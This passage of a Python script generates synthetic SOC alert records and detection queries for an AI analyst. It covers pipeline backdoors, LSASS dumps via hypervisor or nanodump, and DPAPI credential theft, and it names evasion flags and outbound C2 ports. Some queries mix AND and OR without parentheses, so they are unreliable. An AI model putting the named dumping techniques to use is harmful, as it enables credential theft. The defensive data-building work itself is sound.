        + {"service_connection_secret_read": "extracting cloud credentials from pipeline. ",
           "pipeline_yaml_modification": "injecting malicious steps into production deployment. ",
           "variable_group_secret_access": "bulk secret extraction from pipeline library. ",
           "personal_access_token_creation": "creating persistent PAT for long-term access. "}[p['operation']]
        + f"project={p['project']}: production pipeline -- high-impact target. "
        "Off-hours: avoiding DevOps team review.",
        f"Azure DevOps project {p['project']} compromised. "
        "Production deployment pipeline may be backdoored.",
        "Azure DevOps pipeline persistence/backdoor confirmed.",
        "MITRE T1098 (Account Manipulation) + T1552 (Unsecured Credentials). "
        "Revoke PATs, audit pipeline YAML history, rotate service connection secrets.",
    )
    return prompt, cot, "true_positive"

def _ado_persist_fp(i):
    p = {"op": "pipeline_run", "project": "dev-test", "user": "jsmith", "ticket": f"DEV-{random.randint(100,999)}"}
    prompt = (f"Azure DevOps -- Pipeline Execution.\n"
              f"  operation={p['op']}  project={p['project']}\n"
              f"  user={p['user']}  ticket={p['ticket']}  business_hours=YES")
    cot = _cot(
        "Developer running pipeline during business hours with change ticket.",
        f"Authorized user. Business hours. Ticket {p['ticket']}.",
        "Authorized pipeline execution. No action.",
        "Authorized ADO pipeline. No action.",
        "T1098 -- AUTHORIZED PIPELINE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


def _vmkatz_tp(i):
    p = {"src": _ip_int(),
         "vcenter": f"vcenter.{random.choice(['corp','prod','internal'])}.local",
         "vm_target": f"WS-{random.randint(10,99)}.corp.local",
         "method": random.choice(["VM memory snapshot","VMware Tools API","vSphere API memory read"]),
         "output": "lsass_dump.vmem",
         "no_endpoint_agent": True}
    prompt = (f"Linux Sentinel + Network -- Hypervisor LSASS Dump (VMkatz).\n"
              f"Source: {p['src']} → vCenter {p['vcenter']}\n"
              f"  target_vm={p['vm_target']}\n"
              f"  method={p['method']}\n"
              f"  output_file={p['output']}\n"
              f"  endpoint_edr_agent_bypassed=YES (hypervisor-level access)")
    cot = _cot(
        "vCenter administrators create snapshots for backup and DR. "
        f"A {p['method']} of a specific workstation followed by LSASS memory extraction "
        "is not backup activity.",
        f"method={p['method']}: hypervisor-level VM memory access. "
        f"target={p['vm_target']}: specific endpoint selected (not backup scope). "
        f"output={p['output']}: LSASS memory extracted from VM at hypervisor level. "
        "endpoint_edr_bypassed: no EDR on the VM sees this -- "
        "attack occurs entirely at hypervisor layer.",
        f"VM {p['vm_target']}: LSASS credentials extracted via hypervisor. "
        "All logged-in user credentials are compromised with zero endpoint visibility.",
        "Hypervisor-level LSASS credential dump confirmed.",
        "MITRE T1003.001 (LSASS via Hypervisor) + T1550. "
        "Rotate all credentials from affected VM, audit vCenter access logs.",
    )
    return prompt, cot, "true_positive"

def _vmkatz_fp(i):
    p = {"purpose": "VM backup snapshot", "ticket": f"BAK-{random.randint(100,999)}", "sa": "svc-veeam"}
    prompt = (f"Network -- vCenter VM Snapshot.\n"
              f"  account={p['sa']}  purpose={p['purpose']}\n"
              f"  ticket={p['ticket']}  scheduled=YES")
    cot = _cot(
        "Veeam backup creating scheduled VM snapshot -- service account, ticket, scheduled.",
        f"svc-veeam. Scheduled. Ticket {p['ticket']}.",
        "Authorized VM backup snapshot. No action.",
        "Authorized backup. No action.",
        "T1003 -- AUTHORIZED BACKUP. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


def _nanodump_tp(i):
    techniques = ["--duplicate","--seclogon-leak-local","--fork","--snapshot","--elevate-handle"]
    technique  = techniques[i % len(techniques)]
    dump_ext   = random.choice(["docx","png","tmp","log","dat"])
    dump_name  = f"{random.choice(['svc','doc','log','update'])}.{dump_ext}"
    dump_path  = f"C:\\Users\\{_user()}\\AppData\\Local\\Temp\\{dump_name}"
    host = _host(); user = _user()
    access_mask = random.choice(["0x1010","0x1fffff","0x1410","0x40","0x1438"])
    prompt = (f"Windows Sysmon -- LSASS Minidump (nanodump / low-observable).\n"
              f"Host: {host}  User: {user}\n"
              f"  phase_1_access: EventID=10 (ProcessAccess)\n"
              f"    TargetImage: lsass.exe\n"
              f"    GrantedAccess={access_mask}\n"
              f"    technique={technique}  callstack_spoofed=YES\n"
              f"  phase_2_dump: EventID=11 (FileCreate)\n"
              f"    TargetFilename: {dump_path}\n"
              f"    file_magic=MDMP (MiniDump header hidden as .{dump_ext})\n"
              f"    file_size_mb={random.randint(30,120)}\n"
              f"  lsass_creds_extractable=YES  mimikatz_compatible=YES")
    cot = _cot(
        "WER accesses LSASS legitimately for crash analysis using "
        "PROCESS_QUERY_INFORMATION+PROCESS_VM_READ. The discriminators are: "
        "access mask combination that includes writable memory access, "
        "dump written to %TEMP% with a non-dmp extension, and MDMP magic in a document file.",
        f"technique={technique}: nanodump low-observable technique to minimize the handle visible to EDR. "
        f"GrantedAccess={access_mask}: includes memory-read capability -- credential extraction possible. "
        f"dump_path={dump_path}: %TEMP% + .{dump_ext} extension = MDMP header hidden in non-dmp file. "
        "callstack_spoofed: avoids MiniDumpWriteDump detection by EDR call-stack hooks.",
        f"Host {host}: LSASS dumped via {technique}. "
        "All Windows credentials (NTLM, Kerberos, DPAPI) on this host are compromised.",
        "LSASS credential dump via nanodump confirmed.",
        "MITRE T1003.001 (LSASS Memory) + T1027.012. "
        "Rotate all credentials. Enable LSA RunAsPPL. Audit LSASS process access events.",
    )
    return prompt, cot, "true_positive"

def _nanodump_fp(i):
    prompt = (f"Windows Sysmon -- WER LSASS Crash Analysis.\n"
              f"  process=WerFault.exe  parent=svchost.exe\n"
              f"  target=lsass.exe  access=PROCESS_QUERY_INFORMATION+PROCESS_VM_READ\n"
              f"  dump_path=C:\\Windows\\MEMORY.DMP  triggered_by_crash=YES  signed=YES")
    cot = _cot(
        "WerFault.exe accessing LSASS for crash report -- signed, limited access mask, Windows crash path.",
        "WerFault.exe. PROCESS_QUERY+VM_READ only. Windows crash dir. Signed. Crash-triggered.",
        "Authorized WER crash analysis. No action.",
        "Authorized WER. No action.",
        "T1003.001 -- AUTHORIZED WER CRASH ANALYSIS. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


def _dpapi_extract_tp(i):
    targets = ["Chrome","Edge","Firefox","Windows Credential Manager","RDP Credentials","Outlook"]
    target  = targets[i % len(targets)]
    tech    = random.choice(["Invoke-PowerDPAPI","SharpDPAPI","CryptUnprotectData direct"])
    host = _host(); user = _user()
    prompt = (f"Windows Sysmon -- DPAPI Credential Extraction.\n"
              f"Host: {host}  User: {user}\n"
              f"  target={target}  technique={tech}\n"
              f"  phase_1_invoke: EventID=1\n"
              f"    Image=powershell.exe\n"
              f"    CommandLine LIKE '%{tech.split()[0]}%' OR '%MasterKey%' OR '%ProtectedStorage%'\n"
              f"  phase_2_masterkey: EventID=13\n"
              f"    TargetObject=HKCU\\Software\\Microsoft\\Protect\\S-1-5-21-...\n"
              f"    (DPAPI master key registry path)\n"
              f"  phase_3_decrypt: DPAPI_blob_decrypted=YES  credentials_in_memory=YES\n"
              f"  outbound: dst={_ip_ext()}:{random.choice([80,443,4444,8443])}")
    cot = _cot(
        f"DPAPI is used by {target} to protect stored credentials on disk. "
        "Admins may use DPAPI tools for credential recovery in authorized scenarios. "
        "Discriminators: PowerShell invocation by a non-admin user, "
        "targeting browser/credential stores, followed immediately by an outbound connection.",
        f"technique={tech}: known credential extraction framework, not a Windows admin tool. "
        f"target={target}: browser/OS credential stores contain saved passwords and tokens. "
        "DPAPI master key registry access: attacker decrypts all DPAPI-protected blobs in user scope. "
        "outbound immediately after decrypt: credentials sent to C2 server.",
        f"Host {host} ({user}): {target} credentials extracted via {tech}. "
        "All saved credentials compromised.",
        f"DPAPI credential extraction from {target} via {tech} confirmed.",
        "MITRE T1555.003 (Credentials from Browser) + T1552.004 (Private Keys). "
        "Rotate all passwords stored in affected applications. Reset DPAPI master key.",
    )
    return prompt, cot, "true_positive"

def _dpapi_extract_fp(i):
    p = {"sa": "svc-sccm", "target": "Windows Credential Manager", "ticket": f"IT-{random.randint(1000,9999)}"}
    prompt = (f"Windows Sysmon -- Authorized Credential Manager Access.\n"
              f"  account={p['sa']}  target={p['target']}\n"
              f"  ticket={p['ticket']}  service_account=YES  signed_tool=YES  no_outbound=YES")
    cot = _cot(
        "SCCM service account accessing Credential Manager via signed tool with ticket.",
        f"sa={p['sa']}. Signed tool. Ticket {p['ticket']}. No outbound connection.",
        "Authorized credential access. No action.",
        "Authorized SCCM credential access. No action.",
        "T1555 -- AUTHORIZED CREDENTIAL DEPLOYMENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# Registry + Main
# ═══════════════════════════════════════════════════════════════════════════════

TOOL_CLASSES = {
    "RegistryRunKey":        ("sysmon_sensor",  ["T1547.001"],           _rrk_tp,  _rrk_fp),
    "IFEODebuggerHijack":    ("sysmon_sensor",  ["T1546.012"],           _ifeo_tp, _ifeo_fp),
    "ScheduledTask":         ("sysmon_sensor",  ["T1053.005"],           _stp_tp,  _stp_fp),
    "StartupFolderLNK":      ("sysmon_sensor",  ["T1547.001"],           _sfl_tp,  _sfl_fp),
    "WindowsServiceInstall": ("sysmon_sensor",  ["T1543.003"],           _wsi_tp,  _wsi_fp),
    "WMISubscription":       ("sysmon_sensor",  ["T1546.003"],           _wmi_tp,  _wmi_fp),
    "DLLSideloading":        ("sysmon_sensor",  ["T1574.002"],           _dllsl_tp,_dllsl_fp),
    "GPOAbuse":              ("azure_entraid",  ["T1484.001"],           _gpo_tp,  _gpo_fp),
    "IPPrintC2":             ("network_tap",    ["T1071.002","T1505"],   _ipp_tp,  _ipp_fp),
    "WebShellPersist":       ("sysmon_sensor",  ["T1505.003"],           _wsp_tp,  _wsp_fp),
    "CcmBackdoor":           ("sysmon_sensor",  ["T1546.015"],           _ccm_tp,  _ccm_fp),
    "LinuxCronPersistence":  ("linux_sentinel", ["T1053.003"],           _lcp_tp,  _lcp_fp),
    "SystemdService":        ("linux_sentinel", ["T1543.002"],           _sysd_tp, _sysd_fp),
    "PAMBackdoor":           ("linux_sentinel", ["T1556.003"],           _pam_tp,  _pam_fp),
    "LDPreloadBackdoor":     ("linux_sentinel", ["T1574.006"],           _ldp_tp,  _ldp_fp),
    "LKMRootkit":            ("linux_sentinel", ["T1547.006"],           _lkm_tp,  _lkm_fp),
    "EBPFRootkit":           ("linux_sentinel", ["T1014","T1056.004"],   _ebpf_tp, _ebpf_fp),
    "AuthorizedKeysBackdoor":("linux_sentinel", ["T1098.004"],           _akb_tp,  _akb_fp),
    "TokenImpersonation":    ("sysmon_sensor",  ["T1134.001"],           _ti_tp,   _ti_fp),
    "ContainerMOTWBypass":   ("sysmon_sensor",  ["T1553.005"],           _cmb_tp,  _cmb_fp),
    "MacOSLaunchPersistence":("macos_sensor",   ["T1543.001"],           _mac_tp,  _mac_fp),
    "ExcelAddInPersistence": ("sysmon_sensor",  ["T1137.006","T1546"],   _eap_tp,  _eap_fp),
    "HotkeyLNKChain":        ("sysmon_sensor",  ["T1547.001","T1037.001"],_hlk_tp,          _hlk_fp),
    "NetshHelperDLL":        ("sysmon_sensor",  ["T1546.007"],           _netsh_tp,        _netsh_fp),
    "ScreensaverPersistence":("sysmon_sensor",  ["T1546.002"],           _scrnsaver_tp,    _scrnsaver_fp),
    "OfficeMacroTemplate":   ("sysmon_sensor",  ["T1137.001"],           _office_template_tp,_office_template_fp),
    "AzureDevOpsPersistence":("azure_entraid",  ["T1098","T1552"],       _ado_persist_tp,    _ado_persist_fp),
    "VMkatzHypervisorDump":  ("linux_sentinel", ["T1003.001","T1550"],   _vmkatz_tp,         _vmkatz_fp),
    "NanodumpLSASS":         ("sysmon_sensor",  ["T1003.001","T1027.012"],_nanodump_tp,      _nanodump_fp),
    "DPAPISecretExtract":    ("sysmon_sensor",  ["T1555.003","T1552.004"],_dpapi_extract_tp, _dpapi_extract_fp),
}

S3_QUERIES = {
    "RegistryRunKey":        {"sensor":"sysmon_sensor","where":"sysmon_event_id = 13 AND TargetObject LIKE '%CurrentVersion\\\\Run%' AND Details NOT LIKE 'C:\\\\Program Files%'"},
    "ScheduledTask":         {"sensor":"sysmon_sensor","where":"sysmon_event_id = 1 AND (CommandLine LIKE '%Register-ScheduledTask%' OR CommandLine LIKE '%schtasks%/create%')"},
    "WindowsServiceInstall": {"sensor":"sysmon_sensor","where":"sysmon_event_id = 13 AND TargetObject LIKE '%SYSTEM%ControlSet%Services%ImagePath%' AND Details NOT LIKE 'C:\\\\Windows%'"},
    "WMISubscription":       {"sensor":"sysmon_sensor","where":"sysmon_event_id IN (19, 20, 21)"},
    "WebShellPersist":       {"sensor":"sysmon_sensor","where":"ParentImage LIKE '%w3wp%' AND (Image LIKE '%cmd.exe%' OR Image LIKE '%powershell%' OR Image LIKE '%csc.exe%')"},
    "LinuxCronPersistence":  {"sensor":"linux_sentinel","where":"target_file LIKE '/etc/cron%' AND uid > 0 AND comm NOT IN ('crontab','anacron')"},
    "SystemdService":        {"sensor":"linux_sentinel","where":"target_file LIKE '/etc/systemd/system/%.service' AND comm NOT IN ('systemctl','apt','dpkg','yum','ansible')"},
    "LKMRootkit":            {"sensor":"linux_sentinel","where":"comm IN ('insmod','modprobe') AND target_file NOT LIKE '/lib/modules/%'"},
    "AuthorizedKeysBackdoor":{"sensor":"linux_sentinel","where":"target_file LIKE '%/.ssh/authorized_keys' AND uid > 0 AND comm NOT IN ('sshd','vault-agent','ssh-keygen')"},
    "IPPrintC2":             {"sensor":"network_tap","where":"http_uri LIKE '%/printers/%/.printer' AND is_internal_dst = false"},
    "GPOAbuse":              {"sensor":"azure_entraid","where":"operation_name = 'Update policy' AND target_resource_type = 'Group Policy' AND initiated_by_upn NOT LIKE 'svc-%'"},
    "ExcelAddInPersistence": {"sensor":"sysmon_sensor","where":"sysmon_event_id = 11 AND (TargetFilename LIKE '%XLSTART%.xlam' OR TargetFilename LIKE '%XLSTART%.xll') AND Image NOT LIKE '%MsiExec%' AND Image NOT LIKE '%CcmExec%'"},
    "HotkeyLNKChain":        {"sensor":"sysmon_sensor","where":"sysmon_event_id = 11 AND TargetFilename LIKE '%.lnk' AND (TargetFilename LIKE '%Startup%' OR TargetFilename LIKE '%SendTo%') AND Image NOT LIKE '%Explorer%'"},
    "NetshHelperDLL":        {"sensor":"sysmon_sensor","where":"sysmon_event_id = 13 AND TargetObject LIKE '%Microsoft%NetSh%' AND Image NOT LIKE '%Windows%System32%netcfg%'"},
    "ScreensaverPersistence":{"sensor":"sysmon_sensor","where":"sysmon_event_id = 13 AND TargetObject LIKE '%Control Panel%Desktop%SCRNSAVE%' AND Details NOT LIKE '%System32%'"},
    "OfficeMacroTemplate":   {"sensor":"sysmon_sensor","where":"sysmon_event_id = 11 AND TargetFilename LIKE '%Normal.dotm%' AND Image NOT LIKE '%WINWORD%' AND Image NOT LIKE '%TrustedInstaller%'"},
    "AzureDevOpsPersistence":{"sensor":"azure_entraid","where":"(operation_name LIKE '%PersonalAccessToken%' OR operation_name LIKE '%ServicePrincipal%credential%' OR operation_name LIKE '%ApplicationCredential%') AND result_type = 'Success' AND initiated_by_upn NOT LIKE 'svc-%' AND target_resource_type NOT IN ('Directory','Tenant')"},
    "VMkatzHypervisorDump":  {"sensor":"linux_sentinel","where":"target_file LIKE '%lsass%' OR target_file LIKE '%.vmem' AND uid = 0 AND comm NOT IN ('WerFault','werfault')"},
    "NanodumpLSASS":         {"sensor":"sysmon_sensor","where":"sysmon_event_id = 10 AND TargetImage LIKE '%lsass%' AND GrantedAccess NOT IN ('0x1000','0x1400','0x100000')"},
    "DPAPISecretExtract":    {"sensor":"sysmon_sensor","where":"sysmon_event_id = 1 AND Image LIKE '%powershell%' AND CommandLine LIKE '%MasterKey%' OR CommandLine LIKE '%ProtectedStorage%'"},
    "IFEODebuggerHijack":    {"sensor":"sysmon_sensor","where":"sysmon_event_id = 13 AND TargetObject LIKE '%Image File Execution Options%' AND TargetObject LIKE '%Debugger%' AND Image NOT LIKE '%WinDbg%' AND Image NOT LIKE '%devenv%'"},
    "StartupFolderLNK":      {"sensor":"sysmon_sensor","where":"sysmon_event_id = 11 AND TargetFilename LIKE '%.lnk' AND (TargetFilename LIKE '%Startup%' OR TargetFilename LIKE '%Start Menu%') AND Image NOT LIKE '%Explorer%' AND Image NOT LIKE '%installer%'"},
    "DLLSideloading":        {"sensor":"sysmon_sensor","where":"sysmon_event_id = 7 AND Signed = 'false' AND ImageLoaded LIKE '%AppData%' AND Image NOT LIKE 'C:\\\\Windows%' AND Image NOT LIKE 'C:\\\\Program Files%'"},
    "CcmBackdoor":           {"sensor":"sysmon_sensor","where":"sysmon_event_id = 1 AND ParentImage LIKE '%CcmExec%' AND Image NOT LIKE 'C:\\\\Windows%ccm%' AND Image NOT LIKE 'C:\\\\Windows\\\\System32%'"},
    "PAMBackdoor":           {"sensor":"linux_sentinel","where":"target_file LIKE '/lib/security/%.so%' AND comm NOT IN ('dpkg','apt','yum','rpm') AND user_name != 'root'"},
    "LDPreloadBackdoor":     {"sensor":"linux_sentinel","where":"target_file = '/etc/ld.so.preload' AND comm NOT IN ('ldconfig','apt','dpkg','yum') AND user_name != 'root'"},
    "EBPFRootkit":           {"sensor":"linux_sentinel","where":"comm NOT IN ('bpftrace','perf','cilium') AND user_name != 'root' AND message LIKE '%bpf%'"},
    "TokenImpersonation":    {"sensor":"sysmon_sensor","where":"sysmon_event_id = 10 AND GrantedAccess LIKE '%0x1fffff%' AND TargetImage LIKE '%lsass%' OR TargetImage LIKE '%winlogon%' AND Image NOT LIKE 'C:\\\\Windows\\\\System32%'"},
    "ContainerMOTWBypass":   {"sensor":"sysmon_sensor","where":"sysmon_event_id = 1 AND ParentImage LIKE '%explorer%' AND Image LIKE '%.exe' AND CommandLine NOT LIKE '%Program Files%' AND CommandLine NOT LIKE '%Windows%'"},
    "MacOSLaunchPersistence": None,
}


def generate(tool_name, n_tp, n_fp):
    sensor, mitre, tp_fn, fp_fn = TOOL_CLASSES[tool_name]
    records = []
    for i in range(n_tp):
        prompt, cot, cls = tp_fn(i)
        records.append(_record(tool_name, sensor, mitre, _msg(sensor, prompt, cot), cls))
    for i in range(n_fp):
        prompt, cot, cls = fp_fn(i)
        records.append(_record(tool_name, sensor, mitre, _msg(sensor, prompt, cot), cls))
    return records


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--records-per-class",   type=int, default=10)
    ap.add_argument("--admin-fps-per-class", type=int, default=2)
    ap.add_argument("--tool-filter",         type=str, default="")
    args = ap.parse_args()

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    names = list(TOOL_CLASSES.keys())
    if args.tool_filter:
        names = [t.strip() for t in args.tool_filter.split(",")]

    all_records = []
    for name in names:
        recs = generate(name, args.records_per_class, args.admin_fps_per_class)
        all_records.extend(recs)
        tp = sum(1 for r in recs if r["classification"] == "true_positive")
        fp = sum(1 for r in recs if r["classification"] == "false_positive")
        logger.info(f"  {name}: {tp} TP + {fp} FP  ({TOOL_CLASSES[name][0]})")

    with open(OUTPUT_FILE, "w") as f:
        for r in all_records:
            f.write(json.dumps(r) + "\n")

    index = {
        "ttp_category": "Persistence",
        "total_records": len(all_records),
        "tp_records":    sum(1 for r in all_records if r["classification"] == "true_positive"),
        "fp_records":    sum(1 for r in all_records if r["classification"] == "false_positive"),
        "tool_classes": {
            n: {"sensor": TOOL_CLASSES[n][0], "mitre": TOOL_CLASSES[n][1],
                "s3_query": S3_QUERIES.get(n)}
            for n in names
        },
    }
    with open(INDEX_FILE, "w") as f:
        json.dump(index, f, indent=2)

    logger.info(f"[+] {len(all_records)} total records → {OUTPUT_FILE}")
    logger.info(f"    {index['tp_records']} TP  |  {index['fp_records']} FP (admin scenarios)")
    logger.info(f"    Sensors: {sorted(set(r['source_type'] for r in all_records))}")


if __name__ == "__main__":
    main()